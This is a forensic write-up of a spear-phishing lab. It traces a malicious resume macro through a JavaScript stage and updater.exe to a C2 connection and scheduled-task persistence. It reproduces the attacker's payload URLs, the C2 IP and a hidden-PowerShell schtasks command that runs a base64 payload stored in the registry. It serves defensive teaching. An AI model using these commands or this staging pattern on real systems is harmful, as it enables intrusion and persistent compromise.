Boogeyman 2: Spear Phishing, Macro Staging, C2 and Persistence

A senior-style SOC investigation of a Human Resources spear-phishing compromise. The writeup follows the evidence from phishing email to malicious Word macro, JavaScript stage, executable payload, C2 callback and scheduled task persistence.

Investigation Goal Reconstruct how Maxine Beck's workstation was compromised, identify the malicious attachment behavior, validate runtime execution from memory, determine the C2 endpoint, and recover the persistence command.

Scenario Overview

Maxine Beck, an HR employee at Quick Logistics LLC, received a resume-themed application email. The pretext was believable because HR commonly receives external resumes, but the attached Word document contained a malicious VBA macro.

Investigation Mindset

Senior SOC mindset: do not treat the lab as isolated questions. Build an attack chain first, then use each artifact to prove or reject a hypothesis.
Initial Access → Execution → Stage 2 Download → Binary Execution → C2 Callback → Persistence
Email          → Macro     → update.js        → updater.exe      → 128.199.95.189:8080 → Scheduled Task

The key distinction was intent versus runtime evidence: olevba shows what the document was designed to do, while Volatility confirms what actually happened on the victim workstation.

1. Email Triage: Spear Phishing Against HR

The email metadata identified the sender, victim and attachment.

From: westaylor23@outlook.com
To: maxine.beck@quicklogisticsorg.onmicrosoft.com
Subject: Resume - Application for Junior IT Analyst Role
Attachment: resume_WesleyTaylor.doc
Mindset: the lure fits the victim's role. This makes the resume document a realistic spear-phishing initial access vector.

2. Attachment Triage and Hashing

The attachment was a legacy Microsoft Word OLE document. That matters because .doc files can contain VBA macros and OLE automation.

VirusTotal and VMRay supported the suspicion with macro, auto-open, download, file creation and winword.exe → wscript.exe indicators.

md5sum Resume_WesleyTaylor.doc
52c4384a0b9e248b95804352ebec6c5b  Resume_WesleyTaylor.doc
Threat intel note: reputation is supporting context. The strongest proof comes from the original macro and memory artifacts.

3. VBA Macro Analysis with olevba

olevba showed the main logic in NewMacros.bas. The key trigger was Sub AutoOpen(), meaning the macro runs automatically when the document is opened.

The macro created Microsoft.XMLHTTP to download content, ADODB.Stream to write it to disk, and WScript.Shell to execute it.

Downloaded from:
https://files.boogeymanisback.lol/aa2a9c53cbb80416d3b47d85538d9971/update.png

Saved as:
C:\ProgramData\update.js

Executed with:
wscript.exe C:\ProgramData\update.js
Mindset: do not trust extensions. The remote file was named update.png, but the macro saved and executed it as JavaScript.

4. Memory Forensics: Runtime Validation

The process tree confirmed the macro execution chain on the victim workstation.

OUTLOOK.EXE PID 1440
└── WINWORD.EXE PID 1124
    └── wscript.exe PID 4260
        └── updater.exe PID 6216

windows.cmdline validated the exact runtime commands and the Outlook cache path of the opened attachment.

Attachment runtime path:
C:\Users\maxine.beck\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\WQHGCZFT\Resume_WesleyTaylor (002).doc

Stage 2 execution:
wscript.exe C:\ProgramData\update.js

Malicious binary path:
C:\Windows\Tasks\updater.exe
Correlation: macro analysis provided the plan; memory artifacts proved the plan executed.

5. Stage 2 Binary Download

filescan found update[1].png, update[1].exe and updater.exe, showing the staged download flow.

Searching memory strings for boogeymanisback recovered the binary URL.

https://files.boogeymanisback.lol/aa2a9c53cbb80416d3b47d85538d9971/update.exe
Mindset: the answer was not guessed. It was correlated across strings, cache artifacts and the executed updater.exe process.

6. C2 Connection Analysis

windows.netscan showed repeated outbound connections from updater.exe PID 6216 to 128.199.95.189:8080.

Process: updater.exe
PID: 6216
Remote endpoint: 128.199.95.189:8080
IOC enrichment note: the IP is confirmed because it is directly tied to updater.exe in memory, not merely because of a reputation score.

7. Persistence: Scheduled Task and Registry-Stored Payload

The full schtasks command was not recovered from windows.cmdline, so I moved to raw memory strings. ASCII strings gave fragments; Unicode strings provided the clean command.

schtasks /Create /F /SC DAILY /ST 09:00 /TN Updater /TR "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:\Software\Microsoft\Windows\CurrentVersion debug).debug)))\""
Mindset: this is Scheduled Task persistence combined with a registry-stored encoded payload. The task runs hidden PowerShell daily at 09:00 and executes content from HKCU:\Software\Microsoft\Windows\CurrentVersion\debug.

Lessons Learned

  • Macro analysis gives intent; memory forensics confirms actual execution.
  • Parent-child process relationships are critical: WINWORD.EXE → wscript.exe → updater.exe.
  • File extensions are not reliable indicators of file purpose.
  • Raw strings are noisy; promote an IOC only when correlated with process, file or network evidence.
  • Persistence can combine Scheduled Tasks, hidden PowerShell and registry-stored payloads.
